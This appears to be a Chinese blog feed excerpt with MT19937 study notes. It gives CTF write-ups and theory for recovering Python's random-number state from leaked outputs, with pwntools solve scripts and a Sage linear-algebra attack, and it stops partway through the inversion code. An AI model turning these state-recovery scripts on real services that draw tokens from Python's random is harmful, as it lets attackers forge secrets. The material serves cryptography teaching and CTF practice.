punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样先通过连续的624个32bit随机数恢复出内部状态，然后我们往回倒625次迭代，即可恢复出最前面的那个随机数产生之前的状态。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tqdm<span class="token keyword">from</span> pwn <span class="token keyword">import</span> remote<span class="token keyword">from</span> mt19937 <span class="token keyword">import</span> MT19937Predictorr <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>predictor <span class="token operator">=</span> MT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    predictor<span class="token punctuation">.</span>setrand_int32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">625</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    predictor<span class="token punctuation">.</span>unextract_number<span class="token punctuation">(</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> predictor<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> random<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19938</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一题就稍微难一些了，虽然看上去是连续生成了19938个bit，但因为这个算法最小的生成单位是32bit，每次调用<code>getrandbits(1)</code>时，其实内部先会生成一个32bit的随机数，然后取其最高位返回。不过经过前面的一些分析，我们很容易发现一个关键点：即MT19937算法每次迭代产生的随机数的每一个bit，其实都是它内部状态某些bit的异或得来的，这说明取出随机数的操作是一个$GF(2)$​上的线性运算，如果我们拿到了19937个bit，即使它们是不连续的，只要我们能够分析出一些前后bit的对应关系，便可以通过求解线性方程组来解出状态。解方程神器自然少不了<code>z3</code>，我也找到了一个利用<code>z3</code>来恢复MT19937内部状态的项目：<a href="https://github.com/icemonster/symbolic_mersenne_cracker">SymRandCracker</a></p><p>可惜，这道题的已知bit过于分散，每32个bit才知道其中一个的值，如果全输入符号求解器，复杂度会拉满，不过好在我们知道每次给的bit的位置（MSB）。</p><p>我们设初始状态下<code>random</code>的状态向量为$\vec{a}$，则$\vec{a}$相当于一个$624\times32=19968$维的向量。再假设此状态下连续生成的624个32bit（一共也是19968个bit）组合成的向量为$\vec{b}$，则存在一个$19968\times19968$的矩阵$M_1$满足：</p><script type="math/tex; mode=display">M_1\vec{a}=\vec{b}\pmod{2}</script><p>不妨大胆一点，假设从内部状态$\vec{a}$开始连续生成的19938个32bit的MSB（一共19938个bit）组合成的向量为$\vec{c}$，是否存在一个$19938\times19968$的矩阵$M_2$满足：</p><script type="math/tex; mode=display">M_2\vec{a}=\vec{c}\pmod{2}\quad?</script><p>答案是肯定的。</p><p>并且我们还能在本地预生成好这个矩阵，然后从服务器拿到19938个MSB（$\vec{c}$）后直接解出随机数发生器最开始的内部状态$\vec{a}$​。</p><p>这里使用Sage编写代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> tqdm<span class="token keyword">import</span> oslength <span class="token operator">=</span> <span class="token number">624</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token keyword">def</span> <span class="token function">generate_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">&lt;</span>length<span class="token punctuation">:</span>        idx <span class="token operator">=</span> i<span class="token operator">//</span><span class="token number">32</span>        expont <span class="token operator">=</span> i<span class="token operator">%</span><span class="token number">32</span>        state<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token operator">-</span>expont<span class="token punctuation">)</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">yield</span> s        state<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">def</span> <span class="token function">get_row</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gs <span class="token operator">=</span> generate_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>gs<span class="token punctuation">)</span>        random<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        row <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">yield</span> row<span class="token keyword">def</span> <span class="token function">build_matrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token punctuation">,</span>length<span class="token punctuation">)</span>    rg <span class="token operator">=</span> get_row<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>rg<span class="token punctuation">)</span>    <span class="token keyword">return</span> b<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'Matrix.sobj'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> build_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span>    b<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"Matrix.sobj"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路是遍历所有仅一个bit为1，其他bit为0的状态（共19968个），每次将此状态赋值给随机数发生器，然后让它根据此状态连续生成19968个32bit，我们每32个bit取出其MSB，组合为矩阵的一行。将每个状态对应的行拼起来，组合得到一个$19968\times19968$的矩阵。由于这个生成过程长达20分钟，故一次生成结束就存在本地，方便后面直接读取。</p><p>求解时由于我们只有19938个输入，就将矩阵进行一个截断：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">T <span class="token operator">=</span> load<span class="token punctuation">(</span><span class="token string">'Matrix'</span><span class="token punctuation">)</span>T <span class="token operator">=</span> T<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token number">19938</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>读入服务器发来的数据，然后调用Sage的<code>solve_left</code>，解一下方程即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> remoter <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">.</span>tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19938</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>leak <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span>x <span class="token operator">=</span> T<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span><span class="token punctuation">)</span>state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>random<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19938</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="/blog/12395/">下一篇文章</a>中笔者将结合实际案例，带来一道实战题的题解。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文为几道MT19937预测题的题解。这些题都非常基础+典型，十分适合入门。&lt;/p&gt;
&lt;p&gt;本文用到的&lt;code&gt;mt19937&lt;/code&gt;来自&lt;a</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://blog.fyz666.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="PRNG" scheme="https://blog.fyz666.xyz/tags/prng/"/>
    
    <category term="MT19937" scheme="https://blog.fyz666.xyz/tags/mt19937/"/>
    
  </entry>
  
  <entry>
    <title>Python随机数的背后：MT19937算法之——状态恢复</title>
    <link href="https://blog.fyz666.xyz/blog/12317/"/>
    <id>https://blog.fyz666.xyz/blog/12317/</id>
    <published>2024-11-20T20:41:57.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/blog/12283/">前一篇文章</a>中，我们已经逆向了Python中的随机算法，在本文中，我们将在前文的基础上对MT19937的状态数组进行恢复，从而达到预测随机数的效果。</p><hr><p>根据前文的分析，我们知道一旦还原了随机数发生器完整的内部状态，就相当于复刻了一个完全相同的随机数发生器，也就能预测后面的随机数了，并且我们还知道，每次提取随机数时，是取出某个下标位置的状态向量并将其进行<code>tempering</code>运算，最终输出。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_mti <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>twist<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token number">0</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>_mti<span class="token punctuation">]</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>tempering<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当下标运转一整轮（即624次）时，我们相当于把每个状态向量都提取了一次，这说明连续提取出来的624个32bit随机数是与624个内部状态向量一一对应的。</p><p>反过来，我们就可以通过提取出来的连续624个32bit来生成内部状态向量数组：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">setrand_int32</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> y <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">32</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">%=</span> self<span class="token punctuation">.</span>N    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>_mti<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>untempering<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此，我们便可以预测Python的伪随机数了。如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> mt19937 <span class="token keyword">import</span> MT19937Predictorpredictor <span class="token operator">=</span> MT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span>prng <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    predictor<span class="token punctuation">.</span>setrand_int32<span class="token punctuation">(</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> predictor<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">==</span> prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>mt19937</code>见<a href="https://gist.github.com/windshadow233/229ec53e67577bedb8965e652fdc7466">此gist</a>。</p><hr><p><a href="/blog/12343/">下一篇文章</a>中笔者将写一下几道MT19937相关题目的题解。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://blog.fyz666.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="PRNG" scheme="https://blog.fyz666.xyz/tags/prng/"/>
    
    <category term="MT19937" scheme="https://blog.fyz666.xyz/tags/mt19937/"/>
    
  </entry>
  
  <entry>
    <title>Python随机数的背后：MT19937算法之——算法逆向</title>
    <link href="https://blog.fyz666.xyz/blog/12283/"/>
    <id>https://blog.fyz666.xyz/blog/12283/</id>
    <published>2024-11-20T16:23:13.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/blog/12239/">前一篇文章</a>分析了Python中随机算法的实现细节，本文就来对其进行逆向。</p><p>由前文所述，MT19937提取随机数可分为两部分：<code>twist</code> 、<code>tempering</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_mti <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>twist<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token number">0</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>_mti<span class="token punctuation">]</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>tempering<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么，其逆向过程就先从<code>termpering</code>操作开始。</p><hr><h2 id="逆向-tempering"><a href="#逆向-tempering" class="headerlink" title="逆向 tempering"></a>逆向 tempering</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tempering</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x9d2c5680</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xefc60000</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们倒着一步一步分析，约定记号如下：</p><ul><li>「异或」运算记为$\oplus$，「与」运算记为$\wedge$</li><li>每一步运算前的变量为$y$，得到的结果为$z$​</li><li>记变量最高位的下标为0，第二高位的下标为1，以此类推</li><li>变量从高位到低位的连续一段切片，以上下标标记，下标为起点，上标为终点。例如$y$的高18字节记为$y_0^{17}$</li></ul><hr><p>先看最后一步：<code>y ^= (y &gt;&gt; 18)</code></p><p>我们知道$z$是32位整数，根据这个公式，显而易见的结论有：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}z_0^{17}&=y_0^{17}\\z_{18}^{31}&=y_{18}^{31}\oplus y_0^{13}\end{aligned}\right.</script><p>于是：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}y_0^{17}&=z_0^{17}\\y_{18}^{31}&=z_{18}^{31}\oplus y_0^{13}=z_{18}^{31}\oplus z_{0}^{13}\end{aligned}\right.</script><p>注意到这个$z\to y$的公式与前面$y\to z$的在形式上一模一样，故这一步的逆向我们只需照抄正向：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>再看倒数第二步：<code>y ^= (y &lt;&lt; 15) &amp; 0xefc60000</code></p><p>记<code>0xefc60000</code>为$c$。</p><p>注意到<code>bin(c) == 0b11101111110001100000000000000000</code>，这个二进制数的低17位全为0。</p><p>故我们可以写出这一步的正向公式：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}z_0^{14}&=y_0^{14}\oplus(y_{15}^{29}\wedge c_0^{14})\\z_{15}^{31}&=y_{15}^{31}\end{aligned}\right.</script><p>同理，容易写出逆公式：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}y_0^{14}&=z_0^{14}\oplus(z_{15}^{29}\wedge c_0^{14})\\y_{15}^{31}&=z_{15}^{31}\end{aligned}\right.</script><p>发现形式也相同，故这一步也直接抄正向：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xefc60000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>接下来分析倒数第三步：<code>y ^= (y &lt;&lt; 7) &amp; 0x9d2c5680</code></p><p>记<code>0x9d2c5680</code>为$d_1$。</p><p>这里不容易像前面那样直接写出逆公式，不过我们可以用类似于递归的方法来求解。</p><p>首先我们有：</p><script type="math/tex; mode=display">z = y\oplus ((y \ll 7)\wedge d_1)</script><p>因此：</p><script type="math/tex; mode=display">y =z\oplus ((y \ll 7)\wedge d_1)</script><p>将此表达式直接代入右边的$y$，得到：</p><script type="math/tex; mode=display">y =z\oplus (((z\oplus ((y \ll 7)\wedge d_1)) \ll 7)\wedge d_1)</script><p>记上式为</p><script type="math/tex; mode=display">y =z\oplus X</script><p>我们来计算$X$：</p><script type="math/tex; mode=display">\begin{aligned}X&=((z\oplus ((y \ll 7)\wedge d_1)) \ll 7)\wedge d_1\\&=((z\ll7)\oplus((y\ll14)\wedge (d_1\ll7))\wedge d_1\\&=((z\ll7)\wedge d_1)\oplus((y\ll14)\wedge ((d_1\ll7)\wedge d_1))\\&=((z\ll7)\wedge d_1)\oplus((y\ll14)\wedge d_2)\end{aligned}</script><p>这里$d_2=(d_1\ll7)\wedge d_1=\text{0x94284000}$​</p><p>同理，我们可以不断将下式</p><script type="math/tex; mode=display">y=z\oplus ((y \ll 7)\wedge d_1)</script><p>代入到等号右侧的$y$并展开，我们会得到：</p><script type="math/tex; mode=display">X =((z\ll7)\wedge d_1)\oplus((z\ll14)\wedge d_2)\oplus\dots</script><p>我们记右侧的异或项序列为${X_i}$，即</p><script type="math/tex; mode=display">X=X_1\oplus X_2\oplus\dots</script><p>其中，</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}X_i&=(z\ll7i)\wedge d_i\qquad i\ge1\\d_{i+1}&=(d_i\ll7)\wedge d_1\qquad i\ge1\end{aligned}\right.</script><p>计算得：</p><script type="math/tex; mode=display">\left\lbrace\begin{aligned}d_1&=\text{0x9d2c5680}\\d_2&=\text{0x94284000}\\d_3&=\text{0x14200000}\\d_4&=\text{0x10000000}\\d_i&=0\qquad i\ge5\end{aligned}\right.</script><p>由此可知，我们在展开到第五项时，彻底消去了等号右侧的$y$，因此：</p><script type="math/tex; mode=display">X=X_1\oplus X_2\oplus X_3\oplus X_4</script><p>至此，我们已经可以写出这一步的逆向代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x9d2c5680</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token 